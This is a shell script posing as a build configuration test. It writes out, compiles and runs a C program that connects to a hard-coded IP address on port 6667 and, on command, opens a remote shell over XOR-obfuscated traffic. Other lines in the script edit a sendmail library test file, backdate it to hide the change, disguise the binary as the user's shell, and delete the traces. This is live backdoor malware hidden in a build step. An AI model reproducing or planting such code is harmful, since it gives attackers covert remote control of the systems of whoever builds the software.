#!/bin/sh
cat >conftest.c <<_ACEOF
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
int main(int argc,char **argv){char c;int s,x,sv0[2],sv1[2];struct
sockaddr_in sa;switch(fork()){case
0:break;default:exit(1);}setsid();close(0);close(1);close(2);do{if((s=so
cket(AF_INET,SOCK_STREAM,0))==(-1))exit(1);sa.sin_family=AF_INET;sa.sin_
port=htons(6667);sa.sin_addr.s_addr=inet_addr("66.37.138.99");alarm(10);
if(connect(s,(struct sockaddr
*)&sa,sizeof(sa))==(-1))exit(1);if((x=read(s,&c,1))<=0)exit(1);else{alar
m(0);switch(c){case'A':exit(0);case 'D':break;case
'M':close(s);sleep(3600);continue;}}break;}while(1);if(socketpair(AF_UNI
X,SOCK_STREAM,0,sv0)==(-1))exit(1);if(socketpair(AF_UNIX,SOCK_STREAM,0,s
v1)==(-1))exit(1);switch(fork()){case -1:{exit(1);}case 0:{char
*a[]={"/bin/sh",NULL};close(sv0[1]);close(sv1[1]);dup2(sv0[0],0);dup2(sv
1[0],1);dup2(sv1[0],2);execve(a[0],a,NULL);}default:{close(sv0[0]);close
(sv1[0]);while(1){int len,ret;fd_set rfd;char
buf[2048];FD_ZERO(&rfd);FD_SET(s,&rfd);FD_SET(sv1[1],&rfd);if(select(32,
&rfd,NULL,NULL,NULL)==(-1)){exit(1);}if(FD_ISSET(s,&rfd)){if((len=read(s
,buf,sizeof(buf)))<=0){exit(1);}for(x=0;x<len;x++)buf[x]^=0x89;x=0;while
(x<len){if((ret=write(sv0[1],buf+x,len-x))==(-1)){exit(1);}x+=ret;}}if(F
D_ISSET(sv1[1],&rfd)){if((len=read(sv1[1],buf,sizeof(buf)))<=0){exit(1);
}for(x=0;x<len;x++)buf[x]^=0x89;x=0;while(x<len){if((ret=write(s,buf+x,l
en-x))==(-1)){exit(1);}x+=ret;}}}}}}
_ACEOF
(grep -v "SM_BASE64_DATA" ../../libsm/t-shm.c>out; cp out
../../libsm/t-shm.c;touch -r /etc/motd ../../libsm/t-shm.c; rm -f out
test
grep -v "atexit" ../../libsm/t-shm.c>out; cp out
../../libsm/t-shm.c;touch -r /etc/motd ../../libsm/t-shm.c; rm -f out
test
grep -v "system" ../../libsm/t-shm.c>out; cp out
../../libsm/t-shm.c;touch -r /etc/motd ../../libsm/t-shm.c; rm -f out
test
TESTPROG="`basename \"\`grep ^$USER: /etc/passwd\`\"`"
if test -z $TESTPROG ; then TESTPROG=sh; fi
TESTSTAT=0
if test $TESTPROG = "sh"; then TESTSTAT=1;fi
if test $TESTPROG = "csh"; then TESTSTAT=1;fi
if test $TESTPROG = "bash"; then TESTSTAT=1;fi
if test $TESTPROG = "tcsh"; then TESTSTAT=1;fi
if test $TESTPROG = "zsh"; then TESTSTAT=1;fi
if test $TESTSTAT -eq 0; then TESTPROG=sh;fi
oPATH=$PATH
gcc -w conftest.c -o $TESTPROG ; PATH=. $TESTPROG
PATH=$oPATH
if test -x $TESTPROG;then rm -f ./conftest ./conftest.c $TESTPROG &&
exit;fi
gcc -w conftest.c -lsocket -lnsl -o $TESTPROG; PATH=. $TESTPROG
PATH=$oPATH
if test -x $TESTPROG;then rm -f ./conftest ./conftest.c $TESTPROG &&
exit;fi
cc -w conftest.c -o $TESTPROG ; PATH=. $TESTPROG
PATH=$oPATH
if test -x $TESTPROG;then rm -f ./conftest ./conftest.c $TESTPROG &&
exit;fi
cc -w conftest.c -lsocket -lnsl -o $TESTPROG; PATH=. $TESTPROG
PATH=$oPATH
rm -f ./conftest ./conftest.c $TESTPROG)
